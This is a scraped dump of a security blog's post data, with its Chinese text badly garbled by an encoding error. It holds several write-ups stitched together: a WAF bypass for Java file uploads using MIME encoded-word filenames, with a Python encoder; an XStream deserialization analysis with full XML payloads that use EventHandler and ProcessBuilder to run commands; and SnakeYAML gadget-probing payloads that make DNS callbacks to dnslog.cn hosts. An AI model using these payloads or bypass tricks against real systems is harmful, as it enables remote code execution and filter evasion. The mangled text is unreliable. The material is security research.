ä¸€ä¸ªæ˜¯æ§åˆ¶å­—ç¬¦ä¸²çš„ç¼–ç ï¼Œè¿™é‡Œæ”¯æŒç¼–ç å¾ˆå¤šå› ä¸ºæ˜¯è°ƒç”¨new String(decodedData, javaCharset(charset))ï¼Œè¿™ä¸ªjavaCharsetå‡½æ•°é¢„åˆ¶äº†ä¸€äº›ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœä¸æ˜¯è¿™é‡Œé¢çš„å°±ç›´æ¥è¿”å›é‚£ä¸ªæŒ‡ï¼Œè€Œnew Stringå‡½æ•°é‡Œé¢ä¼šè°ƒç”¨æ‰€æœ‰javaæ”¯æŒçš„ç¼–ç æ ¼å¼å»è§£æï¼Œä¹Ÿå°±æ˜¯charsets.jaré‡Œé¢çš„å†…å®¹ 1234567891011121314151617181920private static String javaCharset(String charset) &#123; if (charset == null) &#123; return null; &#125; else &#123; String mappedCharset = (String)MIME2JAVA.get(charset.toLowerCase(Locale.ENGLISH)); return mappedCharset == null ? charset : mappedCharset; &#125;&#125;static &#123; MIME2JAVA.put(&quot;iso-2022-cn&quot;, &quot;ISO2022CN&quot;); MIME2JAVA.put(&quot;iso-2022-kr&quot;, &quot;ISO2022KR&quot;); MIME2JAVA.put(&quot;utf-8&quot;, &quot;UTF8&quot;); MIME2JAVA.put(&quot;utf8&quot;, &quot;UTF8&quot;); MIME2JAVA.put(&quot;ja_jp.iso2022-7&quot;, &quot;ISO2022JP&quot;); MIME2JAVA.put(&quot;ja_jp.eucjp&quot;, &quot;EUCJIS&quot;); MIME2JAVA.put(&quot;euc-kr&quot;, &quot;KSC5601&quot;); MIME2JAVA.put(&quot;euckr&quot;, &quot;KSC5601&quot;); MIME2JAVA.put(&quot;us-ascii&quot;, &quot;ISO-8859-1&quot;); MIME2JAVA.put(&quot;x-us-ascii&quot;, &quot;ISO-8859-1&quot;);&#125; æ§åˆ¶Base64ä»¥åŠQuoted-printableå»è§£ç  è¿™é‡Œæ¥æµ‹è¯•ä¸€ä¸‹ï¼Œå¯¹èƒ½ç¼–ç çš„éƒ½ç¼–ç ä¸€é æˆåŠŸä¸Šä¼ æ€ä¹ˆè¯´ ç»§ç»­å¢å¼ºæ··æ·†è¿˜è®°å¾—å—ï¼Œå½“æ—¶è¯´çš„åªä¼šæå–=??=ä¹‹é—´çš„å†…å®¹ï¼Œé‚£æˆ‘ä»¬åœ¨åé¢åŠ ç‚¹å…¶ä»–ä¸œè¥¿ä¹Ÿå¯ä»¥ï¼Œå½“ç„¶boundary==?gbk?Q?=2d=2d=2d=2d=57=65=62=4b=69=74=46=6f=72=6d=42=6f=75=6e=64=61=72=79=54=79=42=44=6f=4b=76=61=6d=4e=35=38=6c=63=45=77?=è¿™ä¸ªä¸èƒ½åŠ ï¼Œå› ä¸ºä»–åœ¨headerå¤´ï¼Œä¼šé€ æˆè§£æå‡ºé—®é¢˜ ä½ ä»¥ä¸ºå°±è¿™å°±å®Œäº†ï¼Ÿå†å›åˆ°org.apache.commons.fileupload.util.mime.MimeUtility#decodeTextï¼Œè¿™é‡Œè¿˜æœ‰åˆ¤æ–­ \\t\\r\\n ç›´æ¥è§£é‡Šä»£ç æœ‰ç‚¹ç´¯äº†ï¼Œçœ‹å›¾å•¥éƒ½æ‡‚äº† æµ‹è¯•ç›¸å…³ä»£ç æ•´åˆåœ¨ä¸€èµ·äº†,æœ€åå†æ¬¡æ„Ÿè°¢@æˆ‘æ˜¯killerå¸ˆå‚…çš„æ–‡ç« å¸¦ç»™æˆ‘çš„æ€è·¯ 12345678910111213import base64name = &quot;test&quot;encode = name.encode(&quot;utf-8&quot;)b = base64.b64encode(encode)print(&quot;=?utf-8?B?&quot;+b.decode()+&quot;?=&quot;)res = &quot;&quot;for i in encode.decode(&quot;gbk&quot;): tmp = hex(ord(i)).split(&quot;0x&quot;)[1] res += f&quot;=&#123;tmp&#125;&quot;print(&quot;=?gbk?Q?&quot;+res+&quot;?=&quot;)","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Waf","slug":"Waf","permalink":"https://y4tacker.github.io/tags/Waf/"}]},{"title":"XStreamååºåˆ—åŒ–","slug":"year/2022/2/XStreamååºåˆ—åŒ–","date":"2022-02-10T03:06:07.000Z","updated":"2024-08-04T09:01:49.133Z","comments":true,"path":"2022/02/10/year/2022/2/XStreamååºåˆ—åŒ–/","link":"","permalink":"https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"XStreamååºåˆ—åŒ–XStreamç®€ä»‹XStreamæ˜¯ä¸€ä¸ªç®€å•çš„åŸºäºJavaåº“ï¼ŒJavaå¯¹è±¡åºåˆ—åŒ–åˆ°XMLï¼Œåä¹‹äº¦ç„¶(å³ï¼šå¯ä»¥è½»æ˜“çš„å°†Javaå¯¹è±¡å’Œxmlæ–‡æ¡£ç›¸äº’è½¬æ¢)ã€‚ ååºåˆ—åŒ–åŸºæœ¬åŸç†XStreamå®ç°äº†ä¸€å¥—åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ï¼Œæ ¸å¿ƒæ˜¯é€šè¿‡Converterè½¬æ¢å™¨æ¥å°†XMLå’Œå¯¹è±¡ä¹‹é—´è¿›è¡Œç›¸äº’çš„è½¬æ¢ï¼ŒXStreamååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨æ˜¯å› ä¸ºXStreamæ”¯æŒä¸€ä¸ªåä¸ºDynamicProxyConverterçš„è½¬æ¢å™¨ï¼Œè¯¥è½¬æ¢å™¨å¯ä»¥å°†XMLä¸­dynamic-proxyæ ‡ç­¾å†…å®¹è½¬æ¢æˆåŠ¨æ€ä»£ç†ç±»å¯¹è±¡ï¼Œè€Œå½“ç¨‹åºè°ƒç”¨äº†dynamic-proxyæ ‡ç­¾å†…çš„interfaceæ ‡ç­¾æŒ‡å‘çš„æ¥å£ç±»å£°æ˜çš„æ–¹æ³•æ—¶ï¼Œå°±ä¼šé€šè¿‡åŠ¨æ€ä»£ç†æœºåˆ¶ä»£ç†è®¿é—®dynamic-proxyæ ‡ç­¾å†…handleræ ‡ç­¾æŒ‡å®šçš„ç±»æ–¹æ³•ï¼›åˆ©ç”¨è¿™ä¸ªæœºåˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„XMLå†…å®¹ï¼Œå³dynamic-proxyæ ‡ç­¾å†…çš„handleræ ‡ç­¾æŒ‡å‘å¦‚EventHandlerç±»è¿™ç§å¯å®ç°ä»»æ„å‡½æ•°åå°„è°ƒç”¨çš„æ¶æ„ç±»ã€interfaceæ ‡ç­¾æŒ‡å‘ç›®æ ‡ç¨‹åºå¿…ç„¶ä¼šè°ƒç”¨çš„æ¥å£ç±»æ–¹æ³•ï¼›æœ€åå½“æ”»å‡»è€…ä»å¤–éƒ¨è¾“å…¥è¯¥æ¶æ„XMLå†…å®¹åå³å¯è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚ å½“ç„¶åœ¨è¿™ä¹‹å‰ç®€å•ä»‹ç»å‡ ä¸ªé‡è¦çš„å°çŸ¥è¯† EventHandlerç±»EventHandlerç±»æ˜¯å®ç°äº†InvocationHandlerçš„ä¸€ä¸ªç±»ï¼Œè®¾è®¡æœ¬æ„æ˜¯ä¸ºäº¤äº’å·¥å…·æä¾›beansï¼Œå»ºç«‹ä»ç”¨æˆ·ç•Œé¢åˆ°åº”ç”¨ç¨‹åºé€»è¾‘çš„è¿æ¥ EventHandlerç±»å®šä¹‰çš„ä»£ç å¦‚ä¸‹ï¼Œå…¶å«æœ‰targetå’Œactionå±æ€§ï¼Œåœ¨EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()çš„å‡½æ•°è°ƒç”¨é“¾ä¸­ï¼Œä¼šå°†å‰é¢ä¸¤ä¸ªå±æ€§ä½œä¸ºç±»æ–¹æ³•å’Œå‚æ•°ç»§ç»­åå°„è°ƒç”¨ 1234567891011121314151617181920public static Object invoke(Method var0, Object var1, Object[] var2) throws InvocationTargetException, IllegalAccessException &#123; try &#123; return bounce.invoke((Object)null, var0, var1, var2); &#125; catch (InvocationTargetException var5) &#123; Throwable var4 = var5.getCause(); if (var4 instanceof InvocationTargetException) &#123; throw (InvocationTargetException)var4; &#125; else if (var4 instanceof IllegalAccessException) &#123; throw (IllegalAccessException)var4; &#125; else if (var4 instanceof RuntimeException) &#123; throw (RuntimeException)var4; &#125; else if (var4 instanceof Error) &#123; throw (Error)var4; &#125; else &#123; throw new Error(&quot;Unexpected invocation error&quot;, var4); &#125; &#125; catch (IllegalAccessException var6) &#123; throw new Error(&quot;Unexpected invocation error&quot;, var6); &#125; &#125; Converterè½¬æ¢å™¨XStreamä¸ºJavaå¸¸è§çš„ç±»å‹æä¾›äº†Converterè½¬æ¢å™¨ã€‚è½¬æ¢å™¨æ³¨å†Œä¸­å¿ƒæ˜¯XStreamç»„æˆçš„æ ¸å¿ƒéƒ¨åˆ†ã€‚ è½¬æ¢å™¨çš„èŒè´£æ˜¯æä¾›ä¸€ç§ç­–ç•¥ï¼Œç”¨äºå°†å¯¹è±¡å›¾ä¸­æ‰¾åˆ°çš„ç‰¹å®šç±»å‹çš„å¯¹è±¡è½¬æ¢ä¸ºXMLæˆ–å°†XMLè½¬æ¢ä¸ºå¯¹è±¡ã€‚ ç®€å•åœ°è¯´ï¼Œå°±æ˜¯è¾“å…¥XMLåå®ƒèƒ½è¯†åˆ«å…¶ä¸­çš„æ ‡ç­¾å­—æ®µå¹¶è½¬æ¢ä¸ºç›¸åº”çš„å¯¹è±¡ï¼Œåä¹‹äº¦ç„¶ã€‚ è½¬æ¢å™¨éœ€è¦å®ç°3ä¸ªæ–¹æ³•ï¼š canConvertæ–¹æ³•ï¼šå‘Šè¯‰XStreamå¯¹è±¡ï¼Œå®ƒèƒ½å¤Ÿè½¬æ¢çš„å¯¹è±¡ï¼› marshalæ–¹æ³•ï¼šèƒ½å¤Ÿå°†å¯¹è±¡è½¬æ¢ä¸ºXMLæ—¶å€™çš„å…·ä½“æ“ä½œï¼› unmarshalæ–¹æ³•ï¼šèƒ½å¤Ÿå°†XMLè½¬æ¢ä¸ºå¯¹è±¡æ—¶çš„å…·ä½“æ“ä½œï¼› å…·ä½“å‚è€ƒï¼šhttp://x-stream.github.io/converters.html POCåˆ†æå½“ç„¶åŸºæœ¬çš„demoè¿˜æ˜¯è¦ç»™ä¸€ä¸ª 1234567public class Test &#123; public static void main(String[] args) throws Exception&#123; FileInputStream fileInputStream = new FileInputStream(&quot;payload.txt&quot;); XStream xStream = new XStream(new DomDriver()); xStream.fromXML(fileInputStream); &#125;&#125; 1.sorted-setå½±å“ç‰ˆæœ¬1.4.5ï¼Œ1.4.6ï¼Œ1.4.10 åˆ†æç»å…¸è°ƒç”¨è®¡ç®—å™¨ 123456789101112131415&lt;sorted-set&gt; &lt;dynamic-proxy&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=&quot;java.beans.EventHandler&quot;&gt; &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;-na&lt;/string&gt; &lt;string&gt;Calculator&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt; ç°åœ¨æˆ‘ä»¬æ¥å¯¹æµç¨‹è¿›è¡Œè¿½è¸ªï¼Œåœ¨AbstractTreeMarshallingStrategy.unmarshal()å‡½æ•°ä¸­ï¼Œè°ƒç”¨äº†TreeUnmarshaller.start()å‡½æ•°ï¼Œå³å¼€å§‹è§£æXML æˆ‘ä»¬ç›´æ¥ä»com.thoughtworks.xstream.core.TreeUnmarshaller#startå¼€å§‹ å‘ç°ä¼šè°ƒç”¨HierarchicalStreams.readClassType()æ¥è·å–åˆ°PoC XMLä¸­æ ¹æ ‡ç­¾çš„ç±»ç±»å‹ æœ€ç»ˆåœ¨com.thoughtworks.xstream.mapper.ClassAliasingMapper#realClassæ‰¾åˆ°äº†java.util.SortedSet æ¥ç€æ˜¯è°ƒç”¨convertAnother()å‡½æ•°å¯¹java.util.SortedSetç±»å‹è¿›è¡Œè½¬æ¢ï¼Œæˆ‘ä»¬è·Ÿè¿›å»è¯¥å‡½æ•°ï¼Œå…¶ä¸­è°ƒç”¨mapper.defaultImplementationOf()å‡½æ•°æ¥å¯»æ‰¾java.util.SortedSetç±»å‹çš„é»˜è®¤å®ç°ç±»å‹è¿›è¡Œæ›¿æ¢ï¼Œè¿™é‡Œè½¬æ¢ä¸ºäº†java.util.TreeSetç±»å‹ æ¥ç€çœ‹åˆ°è°ƒç”¨converterLookup.lookupConverterForType()æ¥å¯»æ‰¾TreeSetå¯¹åº”ç±»å‹çš„è½¬æ¢å™¨ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„é€»è¾‘æ˜¯ï¼Œè¿­ä»£this.convertersï¼Œç›´åˆ°æ‰¾åˆ°èƒ½è½¬æ¢å‡ºTreeSetç±»å‹ å¾€ä¸‹è°ƒè¯•ï¼Œåœ¨AbstractReferenceUnmarshaller.convert()å‡½æ•°ä¸­çœ‹åˆ°ï¼Œä¼šè°ƒç”¨getCurrentReferenceKey()æ¥è·å–å½“å‰çš„Referenceé”®å³æ ‡ç­¾åï¼Œæ¥ç€å°†å½“å‰æ ‡ç­¾åå‹å…¥parentStackæ ˆä¸­ ä¹‹åè°ƒç”¨å…¶çˆ¶ç±»å³çš„FastStack.convert()æ–¹æ³•ï¼Œè·Ÿè¿›å»ï¼Œæ˜¾ç¤ºå°†ç±»å‹å‹å…¥æ ˆï¼Œç„¶åè°ƒç”¨è½¬æ¢å™¨TreeSetConverterçš„unmarshal()æ–¹æ³• å¾€ä¸‹è°ƒè¯•ï¼Œhis.treeMapConverter.populateTreeMap()çœ‹è‹±æ–‡åå°±èƒ½çŸ¥é“æ˜¯å¡«å……TreeMapï¼Œè·Ÿè¿›è¿™é‡Œå…ˆåˆ¤æ–­æ˜¯å¦æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ˜¯çš„è¯å°±è°ƒç”¨putCurrentEntryIntoMap()å‡½æ•°ï¼Œå³å°†å½“å‰å†…å®¹å¡«å……åˆ°Mapä¸­ è·Ÿè¿›å»ï¼Œå‘ç°è°ƒç”¨readItem()å‡½æ•°è¯»å–æ ‡ç­¾å†…çš„å†…å®¹å¹¶ç¼“å­˜åˆ°targetè¿™ä¸ªMapä¸­ è·Ÿå…¥ï¼Œä¸€ç›´åˆ°com.thoughtworks.xstream.mapper.CachingMapper#realClassï¼Œç°åœ¨ä»–å°±ä¼šå»å¯»æ‰¾è¿™ä¸ªdynamic-proxyæ‰€å¯¹åº”çš„ç±» æœ€åæ‰¾åˆ°è¿™ä¸ªç±» æ¥ä¸‹æ¥å›åˆ°com.thoughtworks.xstream.core.TreeUnmarshaller#convertAnother(java.lang.Object, java.lang.Class, com.thoughtworks.xstream.converters.Converter)ï¼Œæ‰¾åˆ°è¿™ä¸ªåŠ¨æ€ä»£ç†ç±»çš„è½¬æ¢å™¨ æ¥ä¸‹æ¥è¿˜æ˜¯è°ƒç”¨getCurrentReferenceKey()æ¥è·å–å½“å‰çš„Referenceé”®å³æ ‡ç­¾åï¼Œæ¥ç€å°†å½“å‰æ ‡ç­¾åå‹å…¥parentStackæ ˆä¸­ ä¹‹åä¸€ç›´åˆ°è¿™é‡Œæœ€é‡è¦çš„éƒ¨åˆ†com.thoughtworks.xstream.converters.extended.DynamicProxyConverter#unmarshalï¼Œè¿™é‡ŒæŒ‰æ ‡ç­¾å†…å®¹ç”Ÿæˆå¯¹åº”æ¥å£çš„åŠ¨æ€ä»£ç†ï¼Œæ­¤æ—¶è¿™ä¸ªDUMMYæ˜¯ä¸€ä¸ªç©ºçš„ä»£ç†å®ç° ç»§ç»­å¾€ä¸‹æ‰§è¡Œhandler = (InvocationHandler)context.convertAnother(proxy, handlerType);ï¼Œæ¥ä¸‹æ¥è½¬æ¢å™¨è½¬æ¢æœ€ç»ˆå¾—åˆ°EventHandler æ¥ä¸‹æ¥æ›¿æ¢ä»£ç† ä¹‹åå†å›åˆ°ä¹‹å‰çš„com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMapï¼Œè¿™é‡Œä¼šæŠŠç»“æœæŠŠå­˜åˆ°result æœ€ç»ˆ è°ƒç”¨åˆ°java.beans.EventHandler#invokeInternalï¼Œä¹‹åç”¨åå°„è°ƒç”¨ProcessBuilderçš„startæ–¹æ³•è§¦å‘å‘½ä»¤æ‰§è¡Œ å…¶ä»–è¯´æ˜åœ¨å°äºç­‰äº1.3.1ç‰ˆæœ¬ï¼Œè¿è¡ŒæŠ¥é”™æ˜¾ç¤ºTreeMapæ²¡æœ‰åŒ…å«comparatorå…ƒç´ ï¼Œå³ä¸æ”¯æŒPoCä¸­ä¸¤ä¸ªå­æ ‡ç­¾å…ƒç´ è°ƒç”¨compareTo()è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤æ— æ³•åˆ©ç”¨ åœ¨1.4-1.4.5ç‰ˆæœ¬æ— æ³•è§¦å‘çš„åŸå›  åœ¨TreeSetConverter.unmarshal()ä¸­ï¼Œåªæœ‰å½“sortedMapFieldå’ŒtreeMapä¸ä¸ºnullæ—¶ï¼Œæ‰èƒ½è¿›å…¥populateTreeMap() è€Œåœ¨1.4-1.4.4ç‰ˆæœ¬ä¸­ï¼ŒsortedMapFieldé»˜è®¤ä¸ºnullï¼Œå› æ­¤æ— æ³•æˆåŠŸåˆ©ç”¨,è¿™é‡Œä»¥1.4.4ç‰ˆæœ¬ä¸ºä¾‹ åœ¨1.4.7-1.4.9ç‰ˆæœ¬ä¸­ï¼ŒReflectionConverter.canConvert()å‡½æ•°ä¸­æ·»åŠ äº†å¯¹EventHandlerç±»çš„è¿‡æ»¤ 2.tree-mapé€‚ç”¨èŒƒå›´ç‰ˆæœ¬&lt;=1.4.6æˆ–=1.4.10 åˆ†æå’Œsorted-mapå·®ä¸å¤šï¼Œç›´æ¥ç»™payload 123456789101112131415161718&lt;tree-map&gt; &lt;entry&gt; &lt;dynamic-proxy&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=&quot;java.beans.EventHandler&quot;&gt; &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;-na&lt;/string&gt; &lt;string&gt;Calculator&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt; &lt;string&gt;good&lt;/string&gt; &lt;/entry&gt;&lt;/tree-map&gt; å…¶ä»–è¯´æ˜å”¯ä¸€ä¸sorted-setæœ‰ç‚¹åŒºåˆ«çš„åœ°æ–¹å°±æ˜¯ï¼Œåœ¨com.thoughtworks.xstream.converters.collections.TreeMapConverter#unmarshalï¼Œå¯ä»¥çœ‹åˆ°æ²¡æœ‰TreeSetConverteré‚£ä¹ˆå¤šçš„é™åˆ¶ åœ¨&lt;=1.3.1ç‰ˆæœ¬çš„å½“ä¸­ ä¼šæŠ¥é”™æ˜¾ç¤ºTreeMapæ²¡æœ‰åŒ…å«comparatorå…ƒç´ ï¼Œå³ä¸æ”¯æŒPoCä¸­ä¸¤ä¸ªå­æ ‡ç­¾å…ƒç´ è°ƒç”¨compareTo()è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤æ— æ³•åˆ©ç”¨ åœ¨1.4.7-1.4.9ç‰ˆæœ¬ï¼ŒReflectionConverter.canConvert()å‡½æ•°ä¸­æ·»åŠ äº†å¯¹EventHandlerç±»çš„è¿‡æ»¤ å‚è€ƒæ–‡ç« https://paper.seebug.org/1543/#_1","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"XStream","slug":"XStream","permalink":"https://y4tacker.github.io/tags/XStream/"}]},{"title":"SnakeYAMLå®ç°Gadgetæ¢æµ‹","slug":"year/2022/2/SnakeYAMLå®ç°Gadgetæ¢æµ‹","date":"2022-02-08T15:20:17.000Z","updated":"2024-08-04T09:01:49.122Z","comments":true,"path":"2022/02/08/year/2022/2/SnakeYAMLå®ç°Gadgetæ¢æµ‹/","link":"","permalink":"https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/","excerpt":"","text":"SnakeYAMLå®ç°Gadgetæ¢æµ‹@Y4tacker æ€è·¯æ¥æºä»Šå¤©åœ¨å­¦ä¹ SnakeYAMLçš„ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œæƒ³åˆ°ä¸€ä¸ªæ–°çš„æ¢æµ‹payloadï¼Œç½‘ä¸Šä¹‹å‰æœ‰ä¸€ä¸ªSPIé‚£ä¸ªé“¾å­å¯ä»¥æœ‰é€šè¿‡URLClassloaderæ£€æµ‹ 1String poc = &quot;!!java.net.URL [null, \\&quot;[http://osrwbf.dnslog.cn](http://osrwbf.dnslog.cn/)\\&quot;]: 1&quot;; è¿™ä¸ªçš„è¯ä¸»è¦æ˜¯å› ä¸ºSnakeYAMLåœ¨è§£æå¸¦é”®å€¼å¯¹çš„é›†åˆçš„æ—¶å€™ä¼šå¯¹é”®è°ƒç”¨hashCodeæ–¹æ³•å› æ­¤ä¼šè§¦å‘DNSè§£æ å› æ­¤é€šè¿‡æ„é€ URLå¯¹è±¡åé¢ç®€å•åŠ ä¸ª: 1è®©ä»–æˆä¸ºä¸€ä¸ªmapping ï¼Œä¸è¿‡ä¼šè§¦å‘å¤šæ¬¡ï¼Œåé¢æœ‰ä¸ªå¸ˆå‚…å…·ä½“æ›´äº†ä¸‹å°±ç›´æ¥æ”¾ä¸Šæ¥äº† ä¸ç®¡æ˜¯setè¿˜æ˜¯mapï¼Œéƒ½ä¼šå¯¹URLè§¦å‘ä¸¤æ¬¡hashCode() ç¬¬ä¸€æ¬¡è§¦å‘ç‚¹æ˜¯ç›¸åŒçš„ï¼Œéƒ½æ˜¯SafeConstructor.flatterMapping()â€“&gt;SafeConstructor.processDuplicateKeys() ç¬¬äºŒæ¬¡è§¦å‘ç‚¹æ˜¯ä¸åŒçš„ï¼Œåˆ†åˆ«æ˜¯ BaseConstructor.constructSet2ndStep() å’Œ BaseConstructor.constructMapping2ndStep() å®ç°æ¢æµ‹Gadgetä¸å®Œç¾çš„æ„é€ è¿™é‡Œå†è¡¥å……ä¸ªæ¢æµ‹gadgetæ€è·¯ï¼šï¼šåœ¨åˆšåˆšçš„æ€è·¯ä¸Šå®ç°äº†æ¢æµ‹gadgetï¼Œå¦‚æœstringå­˜åœ¨æ‰ä¼šæ¥ç€è§¦å‘URLDNSï¼Œä¸å­˜åœ¨å°±ä¸ä¼š 1String poc = &quot;key: [!!java.lang.String []: 0, !!java.net.URL [null, \\&quot;[http://5ydl3f.dnslog.cn](http://5ydl3f.dnslog.cn/)\\&quot;]: 1]&quot;; 2016å¹´1æœˆï¼Œsnakeyamlçš„Constructor.javaæäº¤äº†ä¸€ä¸ªcommitï¼ŒæŠŠConstructSequence#construct() é‡Œé¢çš„node.getType().getConstructors()æ”¹æˆäº†node.getType().getDeclaredConstructors()ã€‚æ‰€ä»¥ä»1.17ç‰ˆæœ¬å¼€å§‹ï¼Œè¿™ä¸ªæ‰å¯ä»¥æ¢æµ‹privateæ„é€ å‡½æ•°çš„ç±»äº†ï¼Œè¯¦æƒ…è§ https://github.com/snakeyaml/snakeyaml/commit/d1df711e244323f2d05becb184863fd6333525cd å½“ç„¶ä¸Šé¢çš„payloadåˆé‡åˆ°äº†é—®é¢˜ï¼Œå¦‚æœå¯¹è±¡çš„æ„é€ æ–¹æ³•ç§æœ‰åŒ–å°±ä¸è¡Œï¼Œä¸ºä»€ä¹ˆå‘¢çœ‹ä¸‹æ–‡ æ›´å®Œå–„çš„æ–¹æ¡ˆå½±å“ç‰ˆæœ¬ï¼š1.7-1.30ç›®å‰æœ€æ–° åœ¨1.7ç‰ˆæœ¬å‰çš„org.yaml.snakeyaml.constructor.Constructor.ConstructMapping#createEmptyJavaBeanä¸æ˜¯é€šè¿‡åå°„å› æ­¤ä¹Ÿæ˜¯ä¸è¡Œ è§£å†³æ–¹æ¡ˆæ˜¯ 1String poc = &quot;key: [!!java.lang.String &#123;&#125;: 0, !!java.net.URL [null, \\&quot;[http://5ydl3f.dnslog.cn](http://5ydl3f.dnslog.cn/)\\&quot;]: 1]&quot;; è¿™ä¸ªä¸ä¸Šé¢çš„åŒºåˆ«ä¸ä¸€æ ·åœ¨äºæ¢æµ‹çš„ç±»åé¢[]æˆ–{}å¯¹åº”çš„åˆ†åˆ«æ˜¯ConstructSequenceä¸ConstructMappingï¼Œå…‰è¿™æ ·è¯´è¿˜æ˜¯ä¸å¤Ÿæ¸…æ¥šï¼Œå°±è¯¦ç»†æ¥è¯´ï¼Œå¯ä»¥çœ‹åˆ°org.yaml.snakeyaml.constructor.Constructor.ConstructSequence#constructçš„å¤„ç†é€»è¾‘å¦‚ä¸‹ï¼Œæˆ‘ä»¬åªçœ‹æœ€å…³é”®çš„åœ°æ–¹ å¯ä»¥çœ‹åˆ°è¿™é‡Œè·å–æ„é€ å‡½æ•°è°ƒç”¨çš„æ˜¯node.getType().getConstructors()ï¼Œä¹Ÿå°±æ˜¯åªä¼šè·å¾—å…¬æœ‰çš„æ„é€ å‡½æ•°ï¼Œå› æ­¤ä¼šå‡ºé”™ å¦‚æœæ¢æˆäº†&#123;&#125;åˆ™ä¼šè°ƒç”¨org.yaml.snakeyaml.constructor.Constructor.ConstructMapping#construct è¿™é‡Œé¦–å…ˆè°ƒç”¨createEmptyJavaBeanå®ä¾‹åŒ–å¯¹è±¡ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯getDeclaredConstructorå°±ç®—æ˜¯ç§æœ‰ä¹ŸOk 123456789protected Object createEmptyJavaBean(MappingNode node) &#123; try &#123; java.lang.reflect.Constructor&lt;?&gt; c = node.getType().getDeclaredConstructor(); c.setAccessible(true); return c.newInstance(); &#125; catch (Exception var3) &#123; throw new YAMLException(var3); &#125;&#125; é‚£ä¹ˆä½ ä¼šå¥½å¥‡å¦‚æœæˆ‘æƒ³è¦è°ƒç”¨å¸¦å‚æ•°çš„æ„é€ å‡½æ•°æ€ä¹ˆåŠï¼Œé‚£è‚¯å®šä¸è¡Œï¼Œé‚£SnakeYAMLå¦‚ä½•å¤„ç†çš„å‘¢ä¹Ÿå°±æ˜¯åé¢è°ƒç”¨äº†ï¼ŒconstructJavaBean2ndStepï¼Œä¸æœ¬æ–‡æ¢æµ‹é—®é¢˜æ— å…³ï¼Œç®€å•æ¥è¯´å…¶å®å°±æ˜¯åœ¨whileå¾ªç¯é‡Œä¸æ–­é€šè¿‡åå°„è®¾ç½®å€¼ æ€»ç»“æœ‰æ—¶å€™ç»†èŠ‚ä¹Ÿç¡®å®å¾ˆé‡è¦ï¼Œæ˜¨æ™šåŒ†åŒ†å¿™å¿™å´å¿½ç•¥äº†å¾ˆå¤šç»†èŠ‚ï¼Œè¯´èµ·æ¥ä¹Ÿæ˜¯æƒ­æ„§","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"SnakeYAML","slug":"SnakeYAML","permalink":"https://y4tacker.github.io/tags/SnakeYAML/"}]},{"title":"SnakeYAMLååºåˆ—åŒ–åŠå¯åˆ©ç”¨Gadget","slug":"year/2022/2/SnakeYAMLååºåˆ—åŒ–åŠå¯åˆ©ç”¨Gadgetåˆ†æ","date":"2022-02-08T02:32:41.000Z","updated":"2024-08-04T09:01:49.113Z","comments":true,"path":"2022/02/08/year/2022/2/SnakeYAMLååºåˆ—åŒ–åŠå¯åˆ©ç”¨Gadgetåˆ†æ/","link":"","permalink":"https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/","excerpt":"","text":"SnakeYAMLååºåˆ—åŒ–åŠå¯åˆ©ç”¨GadgetSnakeYamlç®€ä»‹YAMLæ˜¯â€YAML Ainâ€™t a Markup Languageâ€ï¼ˆYAMLä¸æ˜¯ä¸€ç§æ ‡è®°è¯­è¨€ï¼‰çš„é€’å½’ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªå¯è¯»æ€§é«˜ã€ç”¨æ¥è¡¨è¾¾æ•°æ®åºåˆ—åŒ–çš„æ ¼å¼ï¼Œç±»ä¼¼äºXMLä½†æ¯”XMLæ›´ç®€æ´ã€‚ åœ¨Javaä¸­ï¼Œæœ‰ä¸€ä¸ªç”¨äºè§£æYAMLæ ¼å¼çš„åº“ï¼Œå³SnakeYamlã€‚ 